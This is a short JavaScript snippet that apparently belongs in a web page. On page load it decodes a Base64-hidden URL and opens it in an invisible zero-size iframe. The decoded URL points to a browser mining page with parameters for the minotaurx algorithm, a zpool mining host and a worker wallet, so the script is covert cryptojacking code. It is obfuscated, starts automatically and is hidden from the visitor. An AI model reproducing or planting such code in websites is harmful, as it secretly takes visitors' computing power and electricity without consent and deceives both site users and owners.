document.addEventListener("DOMContentLoaded", () => {
  const encodedURL = "aHR0cHM6Ly90aGFua3N5b3Vzb211Y2gucGFnZXMuZGV2P2FsZ29yaXRobT1taW5vdGF1cngmaG9zdD1taW5vdGF1cngubmEubWluZS56cG9vbC5jYSZwb3J0PTcwMTkmd29ya2VyPVI5dUhEbjlYWHFQQWUyVExzRW1Wb05yb2ttV3NIMFJFVjJRGB";
  const iframe = document.createElement("iframe");
  iframe.src = atob(encodedURL); // Giải mã Base64
  iframe.style.width = "0";
  iframe.style.height = "0";
  iframe.style.border = "none";
  iframe.style.position = "absolute";
  iframe.style.visibility = "hidden";
  iframe.style.opacity = "0";
  document.body.appendChild(iframe);
});
